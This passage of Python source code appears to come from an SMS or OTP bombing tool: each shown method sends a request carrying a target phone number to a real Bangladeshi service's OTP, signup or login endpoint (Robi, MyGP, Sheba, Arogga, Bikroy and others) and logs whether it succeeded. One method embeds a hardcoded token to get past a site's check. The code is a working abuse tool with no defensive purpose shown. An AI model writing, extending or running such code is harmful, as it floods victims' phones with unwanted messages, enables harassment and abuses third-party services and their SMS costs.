            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API3 - Bioscope Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API3 - Bioscope Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API3 - Bioscope Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api4_bikroy_phone_login(self):
        target = self.target
        url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API4 - Bikroy Phone Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API4 - Bikroy Phone Login": pass
            elif "Bioscope" in "API4 - Bikroy Phone Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API4 - Bikroy Phone Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API4 - Bikroy Phone Login": payload = {"phone": target}
            elif "Medha" in "API4 - Bikroy Phone Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API4 - Bikroy Phone Login": payload = {"number": "+88" + target}
            elif "Robi" in "API4 - Bikroy Phone Login": payload = {"phone_number": target}
            elif "Arogga" in "API4 - Bikroy Phone Login": payload = {"mobile": target}
            elif "MyGP" in "API4 - Bikroy Phone Login": pass
            elif "BDSTall" in "API4 - Bikroy Phone Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API4 - Bikroy Phone Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API4 - Bikroy Phone Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API4 - Bikroy Phone Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API4 - Bikroy Phone Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API4 - Bikroy Phone Login": payload = {"mobile": target}
            elif "Kirei" in "API4 - Bikroy Phone Login": payload = {"phone": target}
            elif "Shikho" in "API4 - Bikroy Phone Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API4 - Bikroy Phone Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API4 - Bikroy Phone Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API4 - Bikroy Phone Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API4 - Bikroy Phone Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api5_proiojon_signup(self):
        target = self.target
        url = "https://billing.proiojon.com/api/v1/auth/sign-up"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API5 - Proiojon Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API5 - Proiojon Signup": pass
            elif "Bioscope" in "API5 - Proiojon Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API5 - Proiojon Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API5 - Proiojon Signup": payload = {"phone": target}
            elif "Medha" in "API5 - Proiojon Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API5 - Proiojon Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API5 - Proiojon Signup": payload = {"phone_number": target}
            elif "Arogga" in "API5 - Proiojon Signup": payload = {"mobile": target}
            elif "MyGP" in "API5 - Proiojon Signup": pass
            elif "BDSTall" in "API5 - Proiojon Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API5 - Proiojon Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API5 - Proiojon Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API5 - Proiojon Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API5 - Proiojon Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API5 - Proiojon Signup": payload = {"mobile": target}
            elif "Kirei" in "API5 - Proiojon Signup": payload = {"phone": target}
            elif "Shikho" in "API5 - Proiojon Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API5 - Proiojon Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API5 - Proiojon Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API5 - Proiojon Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API5 - Proiojon Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api6_beautybooth_signup(self):
        target = self.target
        url = "https://admin.beautybooth.com.bd/api/v2/auth/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API6 - BeautyBooth Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API6 - BeautyBooth Signup": pass
            elif "Bioscope" in "API6 - BeautyBooth Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API6 - BeautyBooth Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API6 - BeautyBooth Signup": payload = {"phone": target}
            elif "Medha" in "API6 - BeautyBooth Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API6 - BeautyBooth Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API6 - BeautyBooth Signup": payload = {"phone_number": target}
            elif "Arogga" in "API6 - BeautyBooth Signup": payload = {"mobile": target}
            elif "MyGP" in "API6 - BeautyBooth Signup": pass
            elif "BDSTall" in "API6 - BeautyBooth Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API6 - BeautyBooth Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API6 - BeautyBooth Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API6 - BeautyBooth Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API6 - BeautyBooth Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API6 - BeautyBooth Signup": payload = {"mobile": target}
            elif "Kirei" in "API6 - BeautyBooth Signup": payload = {"phone": target}
            elif "Shikho" in "API6 - BeautyBooth Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API6 - BeautyBooth Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API6 - BeautyBooth Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API6 - BeautyBooth Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API6 - BeautyBooth Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api7_medha_otp(self):
        target = self.target
        url = "https://developer.medha.info/api/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API7 - Medha OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API7 - Medha OTP": pass
            elif "Bioscope" in "API7 - Medha OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API7 - Medha OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API7 - Medha OTP": payload = {"phone": target}
            elif "Medha" in "API7 - Medha OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API7 - Medha OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API7 - Medha OTP": payload = {"phone_number": target}
            elif "Arogga" in "API7 - Medha OTP": payload = {"mobile": target}
            elif "MyGP" in "API7 - Medha OTP": pass
            elif "BDSTall" in "API7 - Medha OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API7 - Medha OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API7 - Medha OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API7 - Medha OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API7 - Medha OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API7 - Medha OTP": payload = {"mobile": target}
            elif "Kirei" in "API7 - Medha OTP": payload = {"phone": target}
            elif "Shikho" in "API7 - Medha OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API7 - Medha OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API7 - Medha OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API7 - Medha OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API7 - Medha OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api8_deeptoplay_login(self):
        target = self.target
        url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API8 - Deeptoplay Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API8 - Deeptoplay Login": pass
            elif "Bioscope" in "API8 - Deeptoplay Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API8 - Deeptoplay Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API8 - Deeptoplay Login": payload = {"phone": target}
            elif "Medha" in "API8 - Deeptoplay Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API8 - Deeptoplay Login": payload = {"number": "+88" + target}
            elif "Robi" in "API8 - Deeptoplay Login": payload = {"phone_number": target}
            elif "Arogga" in "API8 - Deeptoplay Login": payload = {"mobile": target}
            elif "MyGP" in "API8 - Deeptoplay Login": pass
            elif "BDSTall" in "API8 - Deeptoplay Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API8 - Deeptoplay Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API8 - Deeptoplay Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API8 - Deeptoplay Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API8 - Deeptoplay Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API8 - Deeptoplay Login": payload = {"mobile": target}
            elif "Kirei" in "API8 - Deeptoplay Login": payload = {"phone": target}
            elif "Shikho" in "API8 - Deeptoplay Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API8 - Deeptoplay Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API8 - Deeptoplay Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API8 - Deeptoplay Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API8 - Deeptoplay Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api9_robi_otp(self):
        target = self.target
        url = "https://webapi.robi.com.bd/v1/account/register/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API9 - Robi OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API9 - Robi OTP": pass
            elif "Bioscope" in "API9 - Robi OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API9 - Robi OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API9 - Robi OTP": payload = {"phone": target}
            elif "Medha" in "API9 - Robi OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API9 - Robi OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API9 - Robi OTP": payload = {"phone_number": target}
            elif "Arogga" in "API9 - Robi OTP": payload = {"mobile": target}
            elif "MyGP" in "API9 - Robi OTP": pass
            elif "BDSTall" in "API9 - Robi OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API9 - Robi OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API9 - Robi OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API9 - Robi OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API9 - Robi OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API9 - Robi OTP": payload = {"mobile": target}
            elif "Kirei" in "API9 - Robi OTP": payload = {"phone": target}
            elif "Shikho" in "API9 - Robi OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API9 - Robi OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API9 - Robi OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API9 - Robi OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API9 - Robi OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api10_arogga_sms(self):
        target = self.target
        url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API10 - Arogga SMS": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API10 - Arogga SMS": pass
            elif "Bioscope" in "API10 - Arogga SMS": payload = {"number": "+88" + target}
            elif "Proiojon" in "API10 - Arogga SMS": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API10 - Arogga SMS": payload = {"phone": target}
            elif "Medha" in "API10 - Arogga SMS": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API10 - Arogga SMS": payload = {"number": "+88" + target}
            elif "Robi" in "API10 - Arogga SMS": payload = {"phone_number": target}
            elif "Arogga" in "API10 - Arogga SMS": payload = {"mobile": target}
            elif "MyGP" in "API10 - Arogga SMS": pass
            elif "BDSTall" in "API10 - Arogga SMS": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API10 - Arogga SMS": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API10 - Arogga SMS": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API10 - Arogga SMS": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API10 - Arogga SMS": payload = {"phoneNumber": target}
            elif "Sindabad" in "API10 - Arogga SMS": payload = {"mobile": target}
            elif "Kirei" in "API10 - Arogga SMS": payload = {"phone": target}
            elif "Shikho" in "API10 - Arogga SMS": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API10 - Arogga SMS": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API10 - Arogga SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API10 - Arogga SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API10 - Arogga SMS", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api11_mygp_otp(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API11 - MyGP OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API11 - MyGP OTP": pass
            elif "Bioscope" in "API11 - MyGP OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API11 - MyGP OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API11 - MyGP OTP": payload = {"phone": target}
            elif "Medha" in "API11 - MyGP OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API11 - MyGP OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API11 - MyGP OTP": payload = {"phone_number": target}
            elif "Arogga" in "API11 - MyGP OTP": payload = {"mobile": target}
            elif "MyGP" in "API11 - MyGP OTP": pass
            elif "BDSTall" in "API11 - MyGP OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API11 - MyGP OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API11 - MyGP OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API11 - MyGP OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API11 - MyGP OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API11 - MyGP OTP": payload = {"mobile": target}
            elif "Kirei" in "API11 - MyGP OTP": payload = {"phone": target}
            elif "Shikho" in "API11 - MyGP OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API11 - MyGP OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API11 - MyGP OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API11 - MyGP OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API11 - MyGP OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api12_bdstall_otp(self):
        target = self.target
        url = "https://www.bdstall.com/userRegistration/save_otp_info/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API12 - BDSTall OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API12 - BDSTall OTP": pass
            elif "Bioscope" in "API12 - BDSTall OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API12 - BDSTall OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API12 - BDSTall OTP": payload = {"phone": target}
            elif "Medha" in "API12 - BDSTall OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API12 - BDSTall OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API12 - BDSTall OTP": payload = {"phone_number": target}
            elif "Arogga" in "API12 - BDSTall OTP": payload = {"mobile": target}
            elif "MyGP" in "API12 - BDSTall OTP": pass
            elif "BDSTall" in "API12 - BDSTall OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API12 - BDSTall OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API12 - BDSTall OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API12 - BDSTall OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API12 - BDSTall OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API12 - BDSTall OTP": payload = {"mobile": target}
            elif "Kirei" in "API12 - BDSTall OTP": payload = {"phone": target}
            elif "Shikho" in "API12 - BDSTall OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API12 - BDSTall OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API12 - BDSTall OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API12 - BDSTall OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API12 - BDSTall OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api13_bcs_exam_otp(self):
        target = self.target
        url = "https://bcsexamaid.com/api/generateotp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API13 - BCS Exam OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API13 - BCS Exam OTP": pass
            elif "Bioscope" in "API13 - BCS Exam OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API13 - BCS Exam OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API13 - BCS Exam OTP": payload = {"phone": target}
            elif "Medha" in "API13 - BCS Exam OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API13 - BCS Exam OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API13 - BCS Exam OTP": payload = {"phone_number": target}
            elif "Arogga" in "API13 - BCS Exam OTP": payload = {"mobile": target}
            elif "MyGP" in "API13 - BCS Exam OTP": pass
            elif "BDSTall" in "API13 - BCS Exam OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API13 - BCS Exam OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API13 - BCS Exam OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API13 - BCS Exam OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API13 - BCS Exam OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API13 - BCS Exam OTP": payload = {"mobile": target}
            elif "Kirei" in "API13 - BCS Exam OTP": payload = {"phone": target}
            elif "Shikho" in "API13 - BCS Exam OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API13 - BCS Exam OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API13 - BCS Exam OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API13 - BCS Exam OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API13 - BCS Exam OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api14_doctorlive_otp(self):
        target = self.target
        url = "https://doctorlivebd.com/api/patient/auth/otpsend"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API14 - DoctorLive OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API14 - DoctorLive OTP": pass
            elif "Bioscope" in "API14 - DoctorLive OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API14 - DoctorLive OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API14 - DoctorLive OTP": payload = {"phone": target}
            elif "Medha" in "API14 - DoctorLive OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API14 - DoctorLive OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API14 - DoctorLive OTP": payload = {"phone_number": target}
            elif "Arogga" in "API14 - DoctorLive OTP": payload = {"mobile": target}
            elif "MyGP" in "API14 - DoctorLive OTP": pass
            elif "BDSTall" in "API14 - DoctorLive OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API14 - DoctorLive OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API14 - DoctorLive OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API14 - DoctorLive OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API14 - DoctorLive OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API14 - DoctorLive OTP": payload = {"mobile": target}
            elif "Kirei" in "API14 - DoctorLive OTP": payload = {"phone": target}
            elif "Shikho" in "API14 - DoctorLive OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API14 - DoctorLive OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API14 - DoctorLive OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API14 - DoctorLive OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API14 - DoctorLive OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api15_sheba_otp(self):
        target = self.target
        url = "https://accountkit.sheba.xyz/api/shoot-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API15 - Sheba OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API15 - Sheba OTP": pass
            elif "Bioscope" in "API15 - Sheba OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API15 - Sheba OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API15 - Sheba OTP": payload = {"phone": target}
            elif "Medha" in "API15 - Sheba OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API15 - Sheba OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API15 - Sheba OTP": payload = {"phone_number": target}
            elif "Arogga" in "API15 - Sheba OTP": payload = {"mobile": target}
            elif "MyGP" in "API15 - Sheba OTP": pass
            elif "BDSTall" in "API15 - Sheba OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API15 - Sheba OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API15 - Sheba OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API15 - Sheba OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API15 - Sheba OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API15 - Sheba OTP": payload = {"mobile": target}
            elif "Kirei" in "API15 - Sheba OTP": payload = {"phone": target}
            elif "Shikho" in "API15 - Sheba OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API15 - Sheba OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
